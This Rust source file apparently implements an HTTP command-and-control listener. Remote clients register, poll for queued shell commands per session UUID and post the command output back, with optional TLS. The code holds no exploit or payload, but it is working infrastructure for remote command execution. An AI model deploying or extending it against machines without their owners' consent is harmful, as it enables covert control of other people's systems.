use crate::session::{Session, SessionData, Status};
use crate::storage::SessionStore;
use crate::Args;
use clap::Parser;
use log::{error, info, warn};
use std::io;
use std::sync::{Arc, RwLock};

#[actix_web::get("/")]
async fn index(
    req: actix_web::HttpRequest,
    session_store: actix_web::web::Data<Arc<RwLock<SessionStore>>>,
) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) =
        (req.headers().get("x-User"), req.headers().get("x-Dir"))
    {
        if let (Ok(user), Ok(directory)) = (
            header_user.to_str().map(String::from),
            header_dir.to_str().map(String::from),
        ) {
            let uuid = uuid::Uuid::new_v4();
            if let Ok(mut store) = session_store.write() {
                info!("new client ({uuid}) with user: {user}");
                store.create_session(Session {
                    uuid: uuid.as_u128(),
                    last_seen: std::time::SystemTime::now(),
                    status: Status::Active,
                    data: SessionData { user, directory },
                });
                return actix_web::HttpResponse::Ok()
                    .content_type("text/plain")
                    .body(uuid.to_string());
            }
        }
    }
    actix_web::HttpResponse::InternalServerError().finish()
}

#[actix_web::get("/{uuid}")]
async fn cmd_input(
    path: actix_web::web::Path<(String,)>,
    req: actix_web::HttpRequest,
    session_store: actix_web::web::Data<Arc<RwLock<SessionStore>>>,
) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) =
        (req.headers().get("x-User"), req.headers().get("x-Dir"))
    {
        if let (Ok(user), Ok(directory)) = (
            header_user.to_str().map(String::from),
            header_dir.to_str().map(String::from),
        ) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            if let Ok(mut store) = session_store.write() {
                if !store.sessions.contains_key(&uuid.as_u128()) {
                    info!("resumed client ({uuid}) with user: {user}");
                    store.create_session(Session {
                        uuid: uuid.as_u128(),
                        last_seen: std::time::SystemTime::now(),
                        status: Status::Active,
                        data: SessionData { user, directory },
                    });
                }
                let _ = store.seen(uuid.as_u128());
                return if let Ok(command) = store.get_pending_command(uuid.as_u128()) {
                    actix_web::HttpResponse::Ok()
                        .content_type("text/plain")
                        .body(command.clone())
                } else {
                    actix_web::HttpResponse::Ok()
                        .content_type("text/plain")
                        .body("")
                };
            }
        }
    }
    actix_web::HttpResponse::InternalServerError().finish()
}

#[actix_web::post("/{uuid}")]
async fn cmd_output(
    path: actix_web::web::Path<(String,)>,
    bytes: actix_web::web::Bytes,
    req: actix_web::HttpRequest,
    session_store: actix_web::web::Data<Arc<RwLock<SessionStore>>>,
) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) =
        (req.headers().get("x-User"), req.headers().get("x-Dir"))
    {
        if let (Ok(user), Ok(directory)) = (
            header_user.to_str().map(String::from),
            header_dir.to_str().map(String::from),
        ) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            let output = String::from_utf8_lossy(&bytes.to_vec()).to_string();
            if let Ok(mut store) = session_store.write() {
                let command = match store.resolve_command(uuid.as_u128(), output) {
                    Ok(command) => command,
                    Err(_) => return actix_web::HttpResponse::InternalServerError().finish(),
                };
                match store.insert_command(uuid.as_u128(), command) {
                    Ok(_) => {}
                    Err(_) => return actix_web::HttpResponse::InternalServerError().finish(),
                }
                match store.update_session_data(uuid.as_u128(), SessionData { user, directory }) {
                    Ok(_) => {}
                    Err(_) => return actix_web::HttpResponse::InternalServerError().finish(),
                }
                return actix_web::HttpResponse::Ok().finish();
            }
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

pub async fn run(
    session_store: Arc<RwLock<SessionStore>>,
) -> io::Result<actix_web::dev::ServerHandle> {
    let args = Args::parse();
    let server = {
        let session_store = session_store.clone();
        actix_web::HttpServer::new(move || {
            actix_web::App::new()
                .app_data(actix_web::web::Data::new(session_store.clone()))
                .service(index)
                .service(cmd_input)
                .service(cmd_output)
        })
    };

    let server_binding = if let (Some(key), Some(cert)) = (args.key, args.cert) {
        info!("using TLS key from {key:?}, and cert from {cert:?}...");
        let mut builder =
            openssl::ssl::SslAcceptor::mozilla_intermediate(openssl::ssl::SslMethod::tls())
                .unwrap();
        builder.set_private_key_file(key, openssl::ssl::SslFiletype::PEM)?;
        builder.set_certificate_chain_file(cert)?;
        server.bind_openssl((args.address, args.port), builder)
    } else {
        info!("no TLS key/cert specified, starting in HTTP only mode!");
        server.bind((args.address, args.port))
    };

    match server_binding {
        Ok(server) => {
            server
                .addrs_with_scheme()
                .iter()
                .for_each(|(addr, scheme)| info!("listening on: {scheme}://{addr}"));
            let run = server.run();
            let handle = run.handle();
            actix_web::rt::spawn(run);
            handle.resume().await;
            Ok(handle)
        }
        Err(err) => {
            error!("{err}");
            Err(io::Error::new(io::ErrorKind::Other, format!("{err}")))
        }
    }
}
